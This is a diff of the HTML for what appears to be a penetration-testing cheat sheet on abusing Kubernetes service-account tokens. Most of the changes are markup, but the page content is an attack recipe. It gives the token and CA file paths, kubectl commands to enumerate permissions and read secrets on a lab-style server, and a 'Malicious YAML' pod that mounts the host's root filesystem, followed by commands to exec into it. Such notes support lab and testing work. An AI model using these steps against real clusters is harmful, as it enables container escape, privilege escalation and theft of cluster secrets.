@@ -194,12 +194,15 @@
 
 <div class="content"><hr>
 <h3 id="token-location">Token Location</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/run/secrets/kubernetes.io/serviceaccount/token
-</span></span></code></pre></div><h3 id="certificate-location">Certificate Location</h3>
+</span></span></code></pre></div></div>
+<h3 id="certificate-location">Certificate Location</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/run/secrets/kubernetes.io/serviceaccount/ca.crt
-</span></span></code></pre></div><h3 id="tools">Tools</h3>
-<p><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/">kubectl</a></p>
+</span></span></code></pre></div></div>
 <h3 id="basic-commands">Basic Commands</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List all namespaces</span>
 </span></span><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get namespaces
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get user permissions in current namespace</span>
@@ -218,35 +221,45 @@
 </span></span><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get secrets -n &lt;NAMESPACE&gt;
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get info of a secret</span>
 </span></span><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 describe secret &lt;secret_name&gt; -n &lt;NAMESPACE&gt;
-</span></span></code></pre></div><h3 id="abuse-1-mount-hosts-file-system">Abuse #1: Mount host&rsquo;s file system</h3>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/">kubectl</a></em></small></p>
+<br>
+<hr>
+<h3 id="abuse-1-mount-hosts-file-system">Abuse #1: Mount host&rsquo;s file system</h3>
 <h4 id="1-create-a-malicious-yaml-template">1. Create a Malicious YAML (Template)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">apiVersion: v1 
-</span></span><span class="line"><span class="cl">kind: Pod
-</span></span><span class="line"><span class="cl">metadata:
-</span></span><span class="line"><span class="cl">  name: alpine
-</span></span><span class="line"><span class="cl">  namespace: &lt;NAMESPACE_NAME&gt;
-</span></span><span class="line"><span class="cl">spec:
-</span></span><span class="line"><span class="cl">  containers:
-</span></span><span class="line"><span class="cl">  - name: test
-</span></span><span class="line"><span class="cl">    image: &lt;IMAGE_NAME&gt;
-</span></span><span class="line"><span class="cl">    command: [&#34;/bin/sh&#34;]
-</span></span><span class="line"><span class="cl">    args: [&#34;-c&#34;, &#34;sleep 300000&#34;]
-</span></span><span class="line"><span class="cl">    volumeMounts: 
-</span></span><span class="line"><span class="cl">    - mountPath: /mnt
-</span></span><span class="line"><span class="cl">      name: hostfs
-</span></span><span class="line"><span class="cl">  volumes:
-</span></span><span class="line"><span class="cl">  - name: hostfs
-</span></span><span class="line"><span class="cl">    hostPath:  
-</span></span><span class="line"><span class="cl">      path: /
-</span></span><span class="line"><span class="cl">  automountServiceAccountToken: true
-</span></span><span class="line"><span class="cl">  hostNetwork: true
-</span></span></code></pre></div><h4 id="2-create-a-new-pod">2. Create a new pod</h4>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1 </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">alpine</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">&lt;NAMESPACE_NAME&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">&lt;IMAGE_NAME&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;sleep 300000&#34;</span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l">/mnt</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostfs</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostfs</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">hostPath</span><span class="p">:</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">automountServiceAccountToken</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostNetwork</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span></code></pre></div></div>
+<h4 id="2-create-a-new-pod">2. Create a new pod</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 apply -f test.yaml
-</span></span></code></pre></div><h4 id="3-execute">3. Execute</h4>
+</span></span></code></pre></div></div>
+<h4 id="3-execute">3. Execute</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 <span class="nb">exec</span> <span class="nb">test</span> --stdin --tty -n &lt;NAMESPACE&gt;
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check host filesystem</span>
 </span></span><span class="line"><span class="cl"><span class="nb">cd</span> /mnt/root/
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
